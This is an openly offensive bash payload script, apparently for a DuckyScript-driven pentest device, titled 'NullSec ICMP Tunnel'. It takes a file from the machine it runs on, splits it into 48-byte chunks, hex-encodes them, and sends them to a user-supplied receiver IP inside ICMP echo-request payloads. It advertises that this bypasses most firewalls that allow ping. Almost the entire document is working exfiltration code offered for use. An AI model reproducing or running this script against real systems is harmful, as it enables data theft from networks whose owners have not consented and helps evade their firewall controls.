#!/bin/bash
# Title: NullSec ICMP Tunnel
# Author: bad-antics
# Description: Exfiltrate data encoded in ICMP echo request payloads
# Category: nullsec

LOOT_DIR="/mmc/nullsec/loot"
mkdir -p "$LOOT_DIR"

PROMPT "ICMP TUNNEL
━━━━━━━━━━━━━━━━━━━━━━━━━
Exfiltrate data using
ICMP echo requests.

Bypasses most firewalls
that allow ping.

Press OK to configure."

DEST_IP=$(EDIT_STRING "Receiver IP:" "")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
[ -z "$DEST_IP" ] && ERROR_DIALOG "No destination IP!" && exit 1

SOURCE_FILE=$(EDIT_STRING "File to exfil:" "/tmp/loot.txt")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac

if [ ! -f "$SOURCE_FILE" ]; then
    ERROR_DIALOG "File not found:\n$SOURCE_FILE"
    exit 1
fi

FILE_SIZE=$(wc -c < "$SOURCE_FILE")
CHUNKS=$(( (FILE_SIZE + 48) / 48 ))

resp=$(CONFIRMATION_DIALOG "ICMP Exfil Config:
━━━━━━━━━━━━━━━━━━━━━━━━━
Dest: $DEST_IP
File: $(basename $SOURCE_FILE)
Size: ${FILE_SIZE} bytes
Chunks: $CHUNKS

START?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Exfiltrating via ICMP..."
SENT=0
FAILED=0

# Split file and send as ICMP payloads
split -b 48 "$SOURCE_FILE" /tmp/icmp_chunk_ 2>/dev/null

for chunk in /tmp/icmp_chunk_*; do
    DATA=$(xxd -p "$chunk" | tr -d '
')
    ping -c 1 -p "$DATA" -s ${#DATA} "$DEST_IP" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        SENT=$((SENT + 1))
    else
        FAILED=$((FAILED + 1))
    fi
    sleep 0.5
done

rm -f /tmp/icmp_chunk_*
SPINNER_STOP

PROMPT "ICMP EXFIL COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━━
Sent: $SENT chunks
Failed: $FAILED
Total: ${FILE_SIZE} bytes

Destination: $DEST_IP"
